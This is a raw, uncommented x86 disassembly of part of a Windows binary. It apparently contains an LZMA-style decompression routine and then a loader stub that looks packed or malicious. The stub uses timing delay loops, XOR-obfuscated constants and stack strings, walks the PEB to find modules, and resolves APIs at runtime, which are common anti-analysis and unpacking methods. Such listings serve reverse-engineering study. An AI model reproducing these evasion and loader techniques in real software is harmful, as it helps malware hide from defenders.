  4246ca:	add    DWORD PTR [eax],ecx
  4246cc:	pop    edi
  4246cd:	pop    esi
  4246ce:	pop    ebx
  4246cf:	leave  
  4246d0:	ret    0x20
  4246d3:	push   edi
  4246d4:	push   esi
  4246d5:	push   ebx
  4246d6:	push   ebp
  4246d7:	mov    ebp,esp
  4246d9:	mov    eax,DWORD PTR [ebp+0x24]
  4246dc:	add    DWORD PTR [ebp+0x28],eax
  4246df:	push   eax
  4246e0:	cld    
  4246e1:	mov    esi,DWORD PTR [ebp+0x18]
  4246e4:	add    DWORD PTR [ebp+0x1c],esi
  4246e7:	push   esi
  4246e8:	mov    esi,DWORD PTR [ebp+0x14]
  4246eb:	lods   eax,DWORD PTR ds:[esi]
  4246ec:	xchg   edx,eax
  4246ed:	push   edx
  4246ee:	mov    cl,BYTE PTR [esi-0x2]
  4246f1:	or     eax,0xffffffff
  4246f4:	shl    eax,cl
  4246f6:	not    eax
  4246f8:	push   eax
  4246f9:	mov    cl,dh
  4246fb:	or     eax,0xffffffff
  4246fe:	shl    eax,cl
  424700:	not    eax
  424702:	push   eax
  424703:	add    cl,dl
  424705:	mov    edi,esi
  424707:	sub    esp,0xc
  42470a:	sub    eax,eax
  42470c:	inc    eax
  42470d:	push   eax
  42470e:	push   eax
  42470f:	push   eax
  424710:	push   eax
  424711:	push   eax
  424712:	push   edi
  424713:	sub    esi,esi
  424715:	push   esi
  424716:	or     ebx,0xffffffff
  424719:	mov    eax,0x300
  42471e:	shl    eax,cl
  424720:	lea    ecx,[eax+0x736]
  424726:	mov    eax,0x4000400
  42472b:	shr    ecx,1
  42472d:	rep stos DWORD PTR es:[edi],eax
  42472f:	push   0x5
  424731:	pop    ecx
  424732:	call   0x424a1d
  424737:	loop   0x424732
  424739:	lea    esi,[esi]
  42473b:	lea    edi,[edi]
  42473d:	mov    edi,DWORD PTR [ebp-0x4]
  424740:	mov    eax,DWORD PTR [ebp-0x10]
  424743:	sub    edi,DWORD PTR [ebp+0x24]
  424746:	and    eax,edi
  424748:	mov    DWORD PTR [ebp-0x18],eax
  42474b:	mov    al,0x0
  42474d:	call   0x424a35
  424752:	jne    0x4247ed
  424758:	mov    cl,BYTE PTR [ebp-0xc]
  42475b:	and    edi,DWORD PTR [ebp-0x14]
  42475e:	shl    edi,cl
  424760:	sub    cl,0x8
  424763:	neg    cl
  424765:	shr    esi,cl
  424767:	pop    eax
  424768:	add    edi,esi
  42476a:	pop    esi
  42476b:	lea    edi,[edi+edi*2]
  42476e:	shl    edi,0x8
  424771:	cmp    al,0x7
  424773:	pop    edx
  424774:	lea    ecx,[esi+edi*2+0xe6c]
  42477b:	push   ecx
  42477c:	push   esi
  42477d:	mov    esi,0x100
  424782:	push   eax
  424783:	mov    al,0x1
  424785:	jb     0x4247bb
  424787:	mov    edi,DWORD PTR [ebp-0x4]
  42478a:	sub    edi,DWORD PTR [ebp-0x24]
  42478d:	movzx  edi,BYTE PTR [edi]
  424790:	mov    ebp,DWORD PTR [ebp-0x34]
  424793:	shl    edi,1
  424795:	mov    ecx,esi
  424797:	and    esi,edi
  424799:	add    ecx,esi
  42479b:	lea    ebp,[ebp+ecx*2+0x0]
  42479f:	call   0x424a54
  4247a4:	mov    ecx,eax
  4247a6:	shr    esi,0x8
  4247a9:	and    ecx,0x1
  4247ac:	cmp    esi,ecx
  4247ae:	mov    esi,0x100
  4247b3:	jne    0x4247c3
  4247b5:	cmp    eax,esi
  4247b7:	jb     0x424790
  4247b9:	jmp    0x4247cf
  4247bb:	mov    ebp,DWORD PTR [ebp-0x34]
  4247be:	call   0x424a54
  4247c3:	inc    eax
  4247c4:	inc    esi
  4247c5:	sub    eax,0x1
  4247c8:	sub    esi,0x1
  4247cb:	cmp    eax,esi
  4247cd:	jb     0x4247bb
  4247cf:	pop    edx
  4247d0:	inc    edx
  4247d1:	cmp    edx,0x5
  4247d4:	dec    edx
  4247d5:	mov    ecx,edx
  4247d7:	jb     0x4247e8
  4247d9:	inc    edx
  4247da:	cmp    edx,0xb
  4247dd:	dec    edx
  4247de:	mov    cl,0x4
  4247e0:	dec    cl
  4247e2:	jb     0x4247e8
  4247e4:	mov    cl,0x7
  4247e6:	dec    cl
  4247e8:	sub    edx,ecx
  4247ea:	push   edx
  4247eb:	jmp    0x42483c
  4247ed:	mov    al,0xc1
  4247ef:	dec    al
  4247f1:	call   0x424a45
  4247f6:	jne    0x42480c
  4247f8:	pop    eax
  4247f9:	pop    edi
  4247fa:	pop    edx
  4247fb:	pop    ecx
  4247fc:	pop    edx
  4247fd:	pop    ecx
  4247fe:	push   DWORD PTR [esp]
  424801:	push   ecx
  424802:	push   edx
  424803:	mov    edx,0x664
  424808:	mov    cl,0x0
  42480a:	jmp    0x42487f
  42480c:	mov    al,0xcd
  42480e:	dec    al
  424810:	call   0x424a45
  424815:	jne    0x424845
  424817:	mov    al,0xf1
  424819:	dec    al
  42481b:	call   0x424a35
  424820:	jne    0x424875
  424822:	pop    eax
  424823:	cmp    al,0x7
  424825:	mov    al,0x9
  424827:	jb     0x42482b
  424829:	mov    al,0xb
  42482b:	push   eax
  42482c:	mov    esi,DWORD PTR [ebp-0x4]
  42482f:	sub    esi,DWORD PTR [ebp-0x24]
  424832:	cmp    esi,DWORD PTR [ebp+0x24]
  424835:	jb     0x424a0c
  42483b:	lods   al,BYTE PTR ds:[esi]
  42483c:	mov    edi,DWORD PTR [ebp-0x4]
  42483f:	stos   BYTE PTR es:[edi],al
  424840:	jmp    0x4249d3
  424845:	mov    al,0xd8
  424847:	call   0x424a45
  42484c:	mov    esi,DWORD PTR [ebp-0x28]
  42484f:	je     0x42486c
  424851:	mov    al,0xe4
  424853:	call   0x424a45
  424858:	mov    esi,DWORD PTR [ebp-0x2c]
  42485b:	je     0x424866
  42485d:	mov    esi,DWORD PTR [ebp-0x30]
  424860:	mov    ecx,DWORD PTR [ebp-0x2c]
  424863:	mov    DWORD PTR [ebp-0x30],ecx
  424866:	mov    ecx,DWORD PTR [ebp-0x28]
  424869:	mov    DWORD PTR [ebp-0x2c],ecx
  42486c:	mov    ecx,DWORD PTR [ebp-0x24]
  42486f:	mov    DWORD PTR [ebp-0x28],ecx
  424872:	mov    DWORD PTR [ebp-0x24],esi
  424875:	pop    eax
  424876:	pop    edi
  424877:	pop    ecx
  424878:	mov    edx,0xa68
  42487d:	mov    cl,0x8
  42487f:	add    edx,edi
  424881:	push   edx
  424882:	push   edi
  424883:	cmp    al,0x7
  424885:	mov    al,cl
  424887:	jb     0x42488b
  424889:	add    al,0x3
  42488b:	push   eax
  42488c:	mov    ebp,DWORD PTR [ebp-0x34]
  42488f:	call   0x424a52
  424894:	jne    0x4248aa
  424896:	mov    eax,DWORD PTR [ebp-0x18]
  424899:	mov    edi,DWORD PTR [ebp-0x34]
  42489c:	shl    eax,0x3
  42489f:	sub    ecx,ecx
  4248a1:	push   0x8
  4248a3:	pop    esi
  4248a4:	lea    edi,[edi+eax*2+0x4]
  4248a8:	jmp    0x4248df
  4248aa:	mov    ebp,DWORD PTR [ebp-0x34]
  4248ad:	add    ebp,0x2
  4248b0:	call   0x424a52
  4248b5:	jne    0x4248cf
  4248b7:	mov    eax,DWORD PTR [ebp-0x18]
  4248ba:	mov    edi,DWORD PTR [ebp-0x34]
  4248bd:	shl    eax,0x3
  4248c0:	push   0x8
  4248c2:	pop    ecx
  4248c3:	push   0x8
  4248c5:	pop    esi
  4248c6:	lea    edi,[edi+eax*2+0x104]
  4248cd:	jmp    0x4248df
  4248cf:	mov    edi,0x204
  4248d4:	add    edi,DWORD PTR [ebp-0x34]
  4248d7:	push   0x10
  4248d9:	pop    ecx
  4248da:	mov    esi,0x100
  4248df:	mov    DWORD PTR [ebp-0x1c],ecx
  4248e2:	sub    eax,eax
  4248e4:	inc    eax
  4248e5:	mov    ebp,edi
  4248e7:	call   0x424a54
  4248ec:	mov    ecx,eax
  4248ee:	sub    ecx,esi
  4248f0:	jb     0x4248e5
  4248f2:	add    DWORD PTR [ebp-0x1c],ecx
  4248f5:	cmp    DWORD PTR [ebp-0x3c],0x4
  4248f9:	jae    0x4249af
  4248ff:	add    DWORD PTR [ebp-0x3c],0x7
  424903:	mov    ecx,DWORD PTR [ebp-0x1c]
  424906:	cmp    ecx,0x4
  424909:	jb     0x42490e
  42490b:	push   0x3
  42490d:	pop    ecx
  42490e:	mov    edi,DWORD PTR [ebp-0x38]
  424911:	shl    ecx,0x6
  424914:	sub    eax,eax
  424916:	inc    eax
  424917:	push   0x40
  424919:	pop    esi
  42491a:	lea    edi,[edi+ecx*2+0x360]
  424921:	mov    ebp,edi
  424923:	call   0x424a54
  424928:	mov    ecx,eax
  42492a:	sub    ecx,esi
  42492c:	jb     0x424921
  42492e:	mov    DWORD PTR [ebp-0x18],ecx
  424931:	mov    DWORD PTR [ebp-0x24],ecx
  424934:	cmp    ecx,0x4
  424937:	jb     0x4249ac
  424939:	mov    esi,ecx
  42493b:	and    DWORD PTR [ebp-0x24],0x1
  42493f:	shr    esi,1
  424941:	or     DWORD PTR [ebp-0x24],0x2
  424945:	dec    esi
  424946:	cmp    ecx,0xe
  424949:	jae    0x424964
  42494b:	mov    eax,0x2af
  424950:	sub    eax,ecx
  424952:	mov    ecx,esi
  424954:	shl    BYTE PTR [ebp-0x24],cl
  424957:	add    eax,DWORD PTR [ebp-0x24]
  42495a:	shl    eax,1
  42495c:	add    eax,DWORD PTR [ebp-0x38]
  42495f:	mov    DWORD PTR [ebp-0x34],eax
  424962:	jmp    0x424991
  424964:	sub    esi,0x4
  424967:	call   0x424a11
  42496c:	shr    ebx,1
  42496e:	shl    DWORD PTR [ebp-0x24],1
  424971:	cmp    DWORD PTR [ebp-0x20],ebx
  424974:	jb     0x42497c
  424976:	inc    DWORD PTR [ebp-0x24]
  424979:	sub    DWORD PTR [ebp-0x20],ebx
  42497c:	dec    esi
  42497d:	jne    0x424967
  42497f:	mov    eax,0x644
  424984:	add    eax,DWORD PTR [ebp-0x38]
  424987:	mov    DWORD PTR [ebp-0x34],eax
  42498a:	shl    DWORD PTR [ebp-0x24],0x4
  42498e:	push   0x4
  424990:	pop    esi
  424991:	sub    edi,edi
  424993:	inc    edi
  424994:	mov    eax,edi
  424996:	mov    ebp,DWORD PTR [ebp-0x34]
  424999:	call   0x424a54
  42499e:	test   al,0x1
  4249a0:	je     0x4249a5
  4249a2:	or     DWORD PTR [ebp-0x24],edi
  4249a5:	shl    edi,1
  4249a7:	dec    esi
  4249a8:	jne    0x424996
  4249aa:	jmp    0x4249ac
  4249ac:	inc    DWORD PTR [ebp-0x24]
  4249af:	mov    ecx,DWORD PTR [ebp-0x1c]
  4249b2:	add    ecx,0x2
  4249b5:	mov    edi,DWORD PTR [ebp-0x4]
  4249b8:	mov    eax,edi
  4249ba:	sub    eax,DWORD PTR [ebp+0x24]
  4249bd:	cmp    DWORD PTR [ebp-0x24],eax
  4249c0:	ja     0x424a0c
  4249c2:	mov    esi,edi
  4249c4:	sub    esi,DWORD PTR [ebp-0x24]
  4249c7:	mov    edx,DWORD PTR [ebp+0x28]
  4249ca:	lods   al,BYTE PTR ds:[esi]
  4249cb:	stos   BYTE PTR es:[edi],al
  4249cc:	cmp    edi,edx
  4249ce:	jae    0x4249d3
  4249d0:	dec    ecx
  4249d1:	jne    0x4249ca
  4249d3:	mov    DWORD PTR [ebp-0x4],edi
  4249d6:	movzx  esi,al
  4249d9:	cmp    edi,DWORD PTR [ebp+0x28]
  4249dc:	jb     0x42473d
  4249e2:	call   0x424a11
  4249e7:	sub    eax,eax
  4249e9:	lea    ebp,[esp+0x3c]
  4249ed:	mov    edx,DWORD PTR [ebp+0x20]
  4249f0:	mov    esi,DWORD PTR [ebp-0x8]
  4249f3:	sub    esi,DWORD PTR [ebp+0x18]
  4249f6:	mov    DWORD PTR [edx],esi
  4249f8:	mov    edx,DWORD PTR [ebp+0x2c]
  4249fb:	mov    edi,DWORD PTR [ebp-0x4]
  4249fe:	sub    edi,DWORD PTR [ebp+0x24]
  424a01:	mov    DWORD PTR [edx],edi
  424a03:	leave  
  424a04:	pop    ebx
  424a05:	pop    esi
  424a06:	pop    edi
  424a07:	ret    0x1c
  424a0a:	pop    esi
  424a0b:	pop    eax
  424a0c:	sub    eax,eax
  424a0e:	inc    eax
  424a0f:	jmp    0x4249e9
  424a11:	cmp    ebx,0x1000000
  424a17:	jb     0x424a1a
  424a19:	ret    
  424a1a:	shl    ebx,0x8
  424a1d:	push   esi
  424a1e:	mov    esi,DWORD PTR [ebp-0x8]
  424a21:	jbe    0x424a82
  424a23:	cli    
  424a24:	push   edi
  424a25:	sbb    eax,0x910d9fb8
  424a2a:	or     eax,0x9fb03caa
  424a2f:	or     eax,0x36d5fb0
  424a34:	cdq    
  424a35:	mov    eax,0x64c69dbf
  424a3a:	lea    edx,[ecx-0x606965ef]
  424a40:	sub    eax,0xa2399196
  424a45:	(bad)  
  424a46:	lea    edx,fs:[esi+0x3fb89d9f]
  424a4d:	lods   eax,DWORD PTR ds:[esi]
  424a4e:	sar    BYTE PTR [ebx],0x9f
  424a51:	mov    dh,BYTE PTR [esi]
  424a53:	(bad)  
  424a54:	sar    BYTE PTR [ebx],0x9f
  424a57:	mov    dl,BYTE PTR [eax-0x75757587]
  424a5d:	mov    ss,WORD PTR [edi-0x6]
  424a60:	mov    eax,0x916a1abb
  424a65:	sbb    ebx,DWORD PTR [edx]
  424a67:	or     ch,BYTE PTR [edx-0x4e5448a]
  424a6d:	push   edi
  424a6e:	cld    
  424a6f:	mov    ah,0xce
  424a71:	mov    DWORD PTR [ebx+0x19916a1a],ebx
  424a77:	stos   BYTE PTR es:[edi],al
  424a78:	lods   al,BYTE PTR ds:[esi]
  424a79:	fistp  DWORD PTR [edx]
  424a7b:	or     bh,BYTE PTR [eax-0x20973947]
  424a81:	mov    dl,BYTE PTR [ecx+0x48c6b631]
  424a87:	mov    ch,0x6e
  424a89:	mov    ebx,0xe6570a1a
  424a8e:	mov    eax,0xaa8a70f1
  424a93:	mov    cl,BYTE PTR [edx+0x3191b536]
  424a99:	sahf   
  424a9a:	and    ecx,DWORD PTR [esi-0x72697541]
  424aa0:	shr    BYTE PTR [esp+0x40],0xc3
  424aa5:	shr    edx,0x5
  424aa8:	sub    DWORD PTR [esp+0x20],ecx
  424aac:	sub    ebx,ecx
  424aae:	sub    WORD PTR [ebp+0x0],dx
  424ab2:	add    eax,eax
  424ab4:	add    eax,0x1
  424ab7:	lea    ebp,[esp+0x40]
  424abb:	ret    
  424abc:	push   ebp
  424abd:	mov    ebp,esp
  424abf:	sub    esp,0x12c
  424ac5:	push   ebx
  424ac6:	push   esi
  424ac7:	push   edi
  424ac8:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  424acf:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  424ad6:	mov    eax,DWORD PTR [ebp+0x8]
  424ad9:	mov    DWORD PTR [ebp+0x8],eax
  424adc:	mov    ecx,DWORD PTR [ebp-0x10]
  424adf:	mov    ebx,0x75108b1
  424ae4:	xor    ecx,ebx
  424ae6:	mov    eax,0x3272f8
  424aeb:	add    ecx,eax
  424aed:	mov    DWORD PTR [ebp-0x24],ecx
  424af0:	mov    ecx,DWORD PTR [ebp-0x10]
  424af3:	xor    ecx,ebx
  424af5:	add    ecx,eax
  424af7:	mov    DWORD PTR [ebp-0x40],ecx
  424afa:	mov    ecx,DWORD PTR [ebp-0x10]
  424afd:	xor    ecx,ebx
  424aff:	add    ecx,eax
  424b01:	mov    DWORD PTR [ebp-0x3c],ecx
  424b04:	mov    ecx,DWORD PTR [ebp-0x10]
  424b07:	xor    ecx,ebx
  424b09:	add    ecx,eax
  424b0b:	mov    DWORD PTR [ebp-0xd8],ecx
  424b11:	mov    DWORD PTR [ebp-0x50],0xf89f05b9
  424b18:	mov    DWORD PTR [ebp-0x3c],0xf89cb5b9
  424b1f:	mov    DWORD PTR [ebp-0x54],0xf89c85bd
  424b26:	push   0x25
  424b28:	pop    ecx
  424b29:	mov    DWORD PTR [ebp-0x30],ecx
  424b2c:	mov    DWORD PTR [ebp-0x30],ecx
  424b2f:	push   0x65
  424b31:	pop    ecx
  424b32:	mov    DWORD PTR [ebp-0x30],ecx
  424b35:	mov    DWORD PTR [ebp-0x30],ecx
  424b38:	mov    DWORD PTR [ebp-0x30],0x4d
  424b3f:	mov    DWORD PTR [ebp-0x30],0x43
  424b46:	mov    ecx,DWORD PTR [ebp-0x10]
  424b49:	xor    ecx,ebx
  424b4b:	add    ecx,eax
  424b4d:	mov    DWORD PTR [ebp-0x30],ecx
  424b50:	mov    ecx,DWORD PTR [ebp-0x10]
  424b53:	xor    ecx,ebx
  424b55:	add    ecx,eax
  424b57:	mov    DWORD PTR [ebp-0x30],ecx
  424b5a:	mov    DWORD PTR [ebp-0x28],0x258
  424b61:	mov    DWORD PTR [ebp-0x34],0x36
  424b68:	mov    DWORD PTR [ebp-0x14],0x7a
  424b6f:	lea    edi,[ebp-0x10c]
  424b75:	lea    esi,[ebp-0x12c]
  424b7b:	call   0x42583b
  424b80:	dec    DWORD PTR [ebp-0x14]
  424b83:	jne    0x424b6f
  424b85:	dec    DWORD PTR [ebp-0x34]
  424b88:	jne    0x424b68
  424b8a:	dec    DWORD PTR [ebp-0x28]
  424b8d:	jne    0x424b61
  424b8f:	mov    DWORD PTR [ebp-0x28],0x400e
  424b96:	mov    eax,DWORD PTR [ebp-0x10]
  424b99:	xor    eax,ebx
  424b9b:	mov    esi,0x3272f8
  424ba0:	add    eax,esi
  424ba2:	mov    DWORD PTR [ebp-0x1c],eax
  424ba5:	mov    eax,DWORD PTR [ebp-0x10]
  424ba8:	and    DWORD PTR [ebp-0x94],0x0
  424baf:	xor    eax,ebx
  424bb1:	add    eax,esi
  424bb3:	mov    DWORD PTR [ebp-0x38],eax
  424bb6:	mov    eax,fs:0x18
  424bbc:	mov    DWORD PTR [ebp-0x94],eax
  424bc2:	mov    eax,DWORD PTR [eax+0x30]
  424bc5:	mov    DWORD PTR [ebp-0xcc],eax
  424bcb:	mov    eax,DWORD PTR [eax+0xc]
  424bce:	mov    DWORD PTR [ebp-0xc0],eax
  424bd4:	mov    eax,DWORD PTR [ebp+0x8]
  424bd7:	lea    ecx,[ebp-0x94]
  424bdd:	mov    DWORD PTR [eax+0x1a0],ecx
  424be3:	mov    eax,DWORD PTR [ebp+0x8]
  424be6:	lea    ecx,[ebp-0xcc]
  424bec:	mov    DWORD PTR [eax+0x1a4],ecx
  424bf2:	mov    eax,DWORD PTR [ebp+0x8]
  424bf5:	push   DWORD PTR [ebp+0x8]
  424bf8:	lea    ecx,[ebp-0xc0]
  424bfe:	mov    DWORD PTR [eax+0x1a8],ecx
  424c04:	call   0x426ffc
  424c09:	mov    ecx,DWORD PTR [ebp-0x10]
  424c0c:	xor    ecx,ebx
  424c0e:	add    ecx,esi
  424c10:	cmp    ecx,eax
  424c12:	je     0x424f95
  424c18:	mov    eax,DWORD PTR [ebp+0x8]
  424c1b:	mov    eax,DWORD PTR [eax+0x194]
  424c21:	mov    ecx,DWORD PTR [eax]
  424c23:	mov    eax,DWORD PTR [ebp+0x8]
  424c26:	mov    eax,DWORD PTR [eax+0x194]
  424c2c:	mov    eax,DWORD PTR [eax]
  424c2e:	add    eax,DWORD PTR [ecx+0x3c]
  424c31:	mov    ecx,DWORD PTR [ebp+0x8]
  424c34:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424c3a:	lea    edx,[ebp-0xec]
  424c40:	push   edx
  424c41:	mov    edx,DWORD PTR [ebp+0x8]
  424c44:	mov    edx,DWORD PTR [edx+0x18c]
  424c4a:	mov    edx,DWORD PTR [edx]
  424c4c:	add    edx,DWORD PTR [eax+0x88]
  424c52:	push   0x4
  424c54:	push   DWORD PTR [eax+0x8c]
  424c5a:	push   edx
  424c5b:	call   DWORD PTR [ecx+0x1c]
  424c5e:	push   DWORD PTR [ebp+0x8]
  424c61:	xor    eax,eax
  424c63:	mov    DWORD PTR [ebp-0xa8],0xe3beeec4
  424c6d:	mov    DWORD PTR [ebp-0xa4],0xeac7eddc
  424c77:	mov    DWORD PTR [ebp-0xa0],0xbcede0f2
  424c81:	mov    BYTE PTR [ebp-0x9c],0x7b
  424c88:	lea    edi,[ebp-0x9b]
  424c8e:	stos   DWORD PTR es:[edi],eax
  424c8f:	stos   WORD PTR es:[edi],ax
  424c91:	stos   BYTE PTR es:[edi],al
  424c92:	xor    eax,eax
  424c94:	mov    DWORD PTR [ebp-0xbc],0xe3beeec4
  424c9e:	mov    DWORD PTR [ebp-0xb8],0xeac7eddc
  424ca8:	mov    DWORD PTR [ebp-0xb4],0xd2ede0f2
  424cb2:	mov    BYTE PTR [ebp-0xb0],0x7b
  424cb9:	lea    edi,[ebp-0xaf]
  424cbf:	stos   DWORD PTR es:[edi],eax
  424cc0:	stos   WORD PTR es:[edi],ax
  424cc2:	stos   BYTE PTR es:[edi],al
  424cc3:	mov    edi,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ebp+0x8]
  424cc9:	mov    edx,DWORD PTR [eax+0x1b8]
  424ccf:	mov    DWORD PTR [ebp-0x68],0xedefeee7
  424cd6:	mov    DWORD PTR [ebp-0x64],0xe4ebe8de
  424cdd:	mov    WORD PTR [ebp-0x60],0x7bbc
  424ce3:	mov    DWORD PTR [ebp-0x90],0xe3beeec4
  424ced:	mov    DWORD PTR [ebp-0x8c],0xe7bceddc
  424cf7:	mov    DWORD PTR [ebp-0x88],0xc9dce3eb
  424d01:	mov    DWORD PTR [ebp-0x84],0xede0e8f0
  424d0b:	mov    DWORD PTR [ebp-0x80],0x7bbcdee4
  424d12:	mov    DWORD PTR [ebp-0x7c],0xe3beeec4
  424d19:	mov    DWORD PTR [ebp-0x78],0xe7bceddc
  424d20:	mov    DWORD PTR [ebp-0x74],0xc9dce3eb
  424d27:	mov    DWORD PTR [ebp-0x70],0xede0e8f0
  424d2e:	mov    DWORD PTR [ebp-0x6c],0x7bd2dee4
  424d35:	call   0x42702b
  424d3a:	push   eax
  424d3b:	mov    eax,DWORD PTR [ebp+0x8]
  424d3e:	mov    eax,DWORD PTR [eax+0x1a8]
  424d44:	push   DWORD PTR [eax]
  424d46:	call   0x426ccc
  424d4b:	test   eax,eax
  424d4d:	jne    0x424d9f
  424d4f:	mov    eax,DWORD PTR [ebp+0x8]
  424d52:	mov    eax,DWORD PTR [eax+0x1e0]
  424d58:	mov    edi,DWORD PTR [ebp+0x8]
  424d5b:	add    eax,0x4
  424d5e:	mov    DWORD PTR [ebp-0x20],eax
  424d61:	mov    eax,DWORD PTR [ebp+0x8]
  424d64:	mov    edx,DWORD PTR [eax+0x1b8]
  424d6a:	call   0x42702b
  424d6f:	push   eax
  424d70:	mov    eax,DWORD PTR [ebp-0x20]
  424d73:	call   DWORD PTR [eax]
  424d75:	test   eax,eax
  424d77:	jne    0x424d9f
  424d79:	mov    eax,DWORD PTR [ebp+0x8]
  424d7c:	mov    eax,DWORD PTR [eax+0x1e0]
  424d82:	mov    edi,DWORD PTR [ebp+0x8]
  424d85:	add    eax,0x10
  424d88:	mov    DWORD PTR [ebp-0x20],eax
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	mov    edx,DWORD PTR [eax+0x1b8]
  424d94:	call   0x42702b
  424d99:	push   eax
  424d9a:	mov    eax,DWORD PTR [ebp-0x20]
  424d9d:	call   DWORD PTR [eax]
  424d9f:	mov    eax,DWORD PTR [ebp-0x10]
  424da2:	mov    ecx,DWORD PTR [ebp-0x28]
  424da5:	xor    eax,ebx
  424da7:	add    eax,esi
  424da9:	cmp    eax,ecx
  424dab:	je     0x424f6e
  424db1:	mov    eax,DWORD PTR [ebp-0x18]
  424db4:	xor    eax,ebx
  424db6:	mov    ecx,0xffcd8d08
  424dbb:	sub    ecx,eax
  424dbd:	add    ecx,DWORD PTR [ebp-0x28]
  424dc0:	mov    eax,DWORD PTR [ebp-0x1c]
  424dc3:	cmp    eax,ecx
  424dc5:	ja     0x424f6e
  424dcb:	mov    DWORD PTR [ebp-0x34],0x0
  424dd2:	push   DWORD PTR [ebp+0x8]
  424dd5:	mov    edi,DWORD PTR [ebp+0x8]
  424dd8:	mov    eax,DWORD PTR [ebp+0x8]
  424ddb:	mov    edx,DWORD PTR [eax+0x1b4]
  424de1:	call   0x42702b
  424de6:	push   eax
  424de7:	mov    eax,DWORD PTR [ebp+0x8]
  424dea:	mov    eax,DWORD PTR [eax+0x1a8]
  424df0:	push   DWORD PTR [eax]
  424df2:	call   0x426ccc
  424df7:	mov    ecx,DWORD PTR [ebp+0x8]
  424dfa:	mov    ecx,DWORD PTR [ecx+0x19c]
  424e00:	mov    DWORD PTR [ecx],eax
  424e02:	mov    eax,DWORD PTR [ebp+0x8]
  424e05:	mov    edi,DWORD PTR [eax+0x1e0]
  424e0b:	mov    esi,DWORD PTR [ebp+0x8]
  424e0e:	xor    eax,eax
  424e10:	lea    edx,[ebp-0x7c]
  424e13:	call   0x427061
  424e18:	push   eax
  424e19:	mov    eax,DWORD PTR [ebp+0x8]
  424e1c:	mov    eax,DWORD PTR [eax+0x19c]
  424e22:	push   DWORD PTR [eax]
  424e24:	call   DWORD PTR [edi+0x8]
  424e27:	mov    DWORD PTR [ebp-0x20],eax
  424e2a:	mov    eax,DWORD PTR [ebp+0x8]
  424e2d:	mov    edi,DWORD PTR [eax+0x1e0]
  424e33:	mov    esi,DWORD PTR [ebp+0x8]
  424e36:	xor    eax,eax
  424e38:	lea    edx,[ebp-0x90]
  424e3e:	call   0x427061
  424e43:	push   eax
  424e44:	mov    eax,DWORD PTR [ebp+0x8]
  424e47:	mov    eax,DWORD PTR [eax+0x19c]
  424e4d:	push   DWORD PTR [eax]
  424e4f:	call   DWORD PTR [edi+0x8]
  424e52:	mov    eax,DWORD PTR [ebp+0x8]
  424e55:	mov    edi,DWORD PTR [eax+0x1e0]
  424e5b:	mov    esi,DWORD PTR [ebp+0x8]
  424e5e:	xor    eax,eax
  424e60:	lea    edx,[ebp-0xa8]
  424e66:	call   0x427061
  424e6b:	push   eax
  424e6c:	mov    eax,DWORD PTR [ebp+0x8]
  424e6f:	mov    eax,DWORD PTR [eax+0x19c]
  424e75:	push   DWORD PTR [eax]
  424e77:	call   DWORD PTR [edi+0x8]
  424e7a:	and    DWORD PTR [ebp-0x8],0x0
  424e7e:	mov    DWORD PTR [ebp-0x48],eax
  424e81:	mov    eax,DWORD PTR [ebp-0x8]
  424e84:	and    eax,0x7
  424e87:	add    eax,0x31
  424e8a:	push   eax
  424e8b:	call   DWORD PTR [ebp-0x20]
  424e8e:	test   eax,eax
  424e90:	je     0x424ed4
  424e92:	mov    eax,DWORD PTR [ebp-0x8]
  424e95:	push   0x19
  424e97:	xor    edx,edx
  424e99:	pop    ecx
  424e9a:	div    ecx
  424e9c:	add    dl,0x41
  424e9f:	movzx  eax,dl
  424ea2:	push   eax
  424ea3:	call   DWORD PTR [ebp-0x48]
  424ea6:	test   eax,eax
  424ea8:	jne    0x424ed4
  424eaa:	mov    eax,DWORD PTR [ebp+0x8]
  424ead:	mov    edi,DWORD PTR [eax+0x1e0]
  424eb3:	mov    esi,DWORD PTR [ebp+0x8]
  424eb6:	xor    eax,eax
  424eb8:	lea    edx,[ebp-0x68]
  424ebb:	call   0x427061
  424ec0:	push   eax
  424ec1:	mov    eax,DWORD PTR [ebp+0x8]
  424ec4:	mov    eax,DWORD PTR [eax+0x198]
  424eca:	push   DWORD PTR [eax]
  424ecc:	call   DWORD PTR [edi+0x8]
  424ecf:	mov    DWORD PTR [ebp-0x14],eax
  424ed2:	jmp    0x424ed8
  424ed4:	and    DWORD PTR [ebp-0x14],0x0
  424ed8:	inc    DWORD PTR [ebp-0x8]
  424edb:	cmp    DWORD PTR [ebp-0x8],0x10
  424edf:	jb     0x424e81
  424ee1:	mov    eax,DWORD PTR [ebp-0x18]
  424ee4:	mov    esi,DWORD PTR [ebp+0x8]
  424ee7:	xor    eax,ebx
  424ee9:	mov    edi,0x3272f8
  424eee:	add    eax,edi
  424ef0:	lea    edx,[ebp-0x10c]
  424ef6:	call   0x427061
  424efb:	push   eax
  424efc:	mov    eax,DWORD PTR [ebp-0x10]
  424eff:	mov    esi,DWORD PTR [ebp+0x8]
  424f02:	xor    eax,ebx
  424f04:	add    eax,edi
  424f06:	lea    edx,[ebp-0x12c]
  424f0c:	call   0x427061
  424f11:	push   eax
  424f12:	call   DWORD PTR [ebp-0x14]
  424f15:	mov    ecx,DWORD PTR [ebp-0x10]
  424f18:	xor    ecx,ebx
  424f1a:	add    ecx,edi
  424f1c:	cmp    ecx,eax
  424f1e:	jne    0x424f27
  424f20:	mov    DWORD PTR [ebp-0x34],0x1
  424f27:	mov    eax,DWORD PTR [ebp-0x18]
  424f2a:	mov    ecx,DWORD PTR [ebp-0x1c]
  424f2d:	xor    eax,ebx
  424f2f:	lea    eax,[eax+ecx*1+0x3272f8]
  424f36:	mov    DWORD PTR [ebp-0x1c],eax
  424f39:	mov    eax,DWORD PTR [ebp-0x34]
  424f3c:	test   eax,eax
  424f3e:	je     0x424f52
  424f40:	mov    eax,DWORD PTR [ebp-0x18]
  424f43:	mov    ecx,DWORD PTR [ebp-0x38]
  424f46:	xor    eax,ebx
  424f48:	lea    eax,[eax+ecx*1+0x3272f8]
  424f4f:	mov    DWORD PTR [ebp-0x38],eax
  424f52:	mov    eax,DWORD PTR [ebp-0x18]
  424f55:	xor    eax,ebx
  424f57:	mov    ecx,0xffcd8d08
  424f5c:	sub    ecx,eax
  424f5e:	add    ecx,DWORD PTR [ebp-0x28]
  424f61:	mov    eax,DWORD PTR [ebp-0x1c]
  424f64:	cmp    eax,ecx
